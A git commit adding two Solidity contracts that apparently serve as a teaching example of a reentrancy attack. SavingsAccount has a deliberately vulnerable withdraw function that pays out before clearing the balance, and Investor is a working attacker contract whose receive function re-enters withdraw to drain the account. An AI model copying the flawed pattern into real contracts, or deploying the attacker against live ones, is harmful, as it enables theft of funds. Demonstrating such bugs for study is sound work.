4bd42b00c9b18bd1e0c27d4e489c8cb140d73685
Viktor Kuzmanov <kuzmanovviktor4@gmail.com>
2021-12-24 12:39:31 +0100

    add new contracts that represent reentracy attack

---
+++ contractInteractionExample/contracts/InvestorV2.sol
@@ -0,0 +1,31 @@
+// SPDX-License-Identifier: GPL-3.0
+pragma solidity ^0.8.9;
+
+import "@openzeppelin/contracts/access/Ownable.sol";
+
+interface ISavingsAccount {
+    function deposit() external payable;
+    function withdraw() external;
+}
+
+contract Investor is Ownable {
+    // this immutable is read-only, but assignable in the constructor
+    ISavingsAccount public immutable savingsAccount;
+
+    constructor(address savingsAccountAddress) {
+        savingsAccount = ISavingsAccount(savingsAccountAddress);
+    }
+
+    function attack() external payable {
+        savingsAccount.deposit{value: msg.value}();
+        savingsAccount.withdraw();  
+    }
+
+    receive() external payable {
+        if(address(savingsAccount).balance > 0) {
+            savingsAccount.withdraw();
+        } else {
+            payable(owner()).transfer(address(this).balance);
+        }
+    }
+}
---
+++ contractInteractionExample/contracts/SavingsAccountV2.sol
@@ -0,0 +1,20 @@
+// SPDX-License-Identifier: GPL-3.0
+pragma solidity ^0.8.9;
+
+import "@openzeppelin/contracts/utils/Address.sol";
+
+contract SavingsAccount {
+    using Address for address payable;
+    mapping(address=>uint256) public balanceOf;
+
+    function deposit() external payable {
+        balanceOf[msg.sender] += msg.value;
+    }
+
+    function withdraw() external payable {
+        uint256 amountDeposited = balanceOf[msg.sender];
+        // execution order is reverted and this is opportunity for rentrancy attack
+        payable(msg.sender).sendValue(amountDeposited);
+        balanceOf[msg.sender] = 0;
+    }
+}
